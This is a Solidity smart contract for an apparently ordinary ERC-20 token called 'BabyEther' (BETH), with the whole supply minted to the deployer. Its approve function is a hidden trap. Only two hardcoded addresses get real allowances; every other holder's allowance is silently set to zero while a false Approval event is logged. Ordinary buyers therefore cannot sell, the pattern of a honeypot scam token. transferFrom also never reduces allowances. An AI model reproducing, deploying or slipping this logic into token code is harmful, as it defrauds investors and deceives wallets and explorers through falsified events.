pragma solidity ^0.8.6;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract BabyEther {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    string public name = "BabyETH";
    string public symbol = "BETH";
    uint public decimals = 9;
    uint public totalSupply = 500_000_000 * 10 ** decimals;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x4E44B8436BC94c889Fe16ECfE1D92036e1B7669b)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x655D431dFBA41b946ed0310ed2Dae9c882930A73)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}